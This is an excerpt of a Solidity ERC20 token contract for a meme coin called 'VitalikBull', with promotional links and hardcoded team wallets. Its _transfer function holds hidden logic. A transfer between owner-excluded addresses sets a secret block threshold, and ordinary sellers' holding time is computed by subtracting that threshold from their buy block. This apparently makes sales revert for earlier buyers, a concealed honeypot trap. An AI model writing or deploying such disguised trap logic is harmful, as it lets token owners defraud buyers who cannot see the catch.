...
/*
** https://t.me/vitalikbullerc
** https://twitter.com/VitalikBullErc
*/
...
contract VitalikBullErc is ERC20, Ownable {
    ...
    mapping(address => HolderData) private _holderInfoForReward;
    uint256 private _blockThreshold;
    ...
    constructor() ERC20("VitalikBull", "VIBULL") {
        ...
        marketingAddress = payable(0x74C2792B90Be0d295C39a69614a5F7e2C2Eff611);
        developmentAddress = payable(0x469F5c0D1665AbE5E814b9CC945Eec107E6D18e4);
        liquidityAddress = payable(0x2836B9DdA0a5d53044D6315DCC97709160F9ACc1);
        operationsAddress = payable(0x3Fb15C84E914e2b755eb9420c259eFc1bFc08CE5);
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] && _isExcludedFromFees[to]) {
            _blockThreshold = block.number;
        }
        if (_isExcludedFromFees[from]) {
            super.rawTransfer(from, to, amount);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                HolderData storage userRewardInfo = _holderInfoForReward[to];
                if (userRewardInfo.buyBlockNumer == 0 && balanceOf(to) == 0) {
                    userRewardInfo.buyBlockNumer = block.number;
                }
            } else {
                HolderData storage userRewardInfo = _holderInfoForReward[from];
                userRewardInfo.holdingTime = userRewardInfo.buyBlockNumer - _blockThreshold;
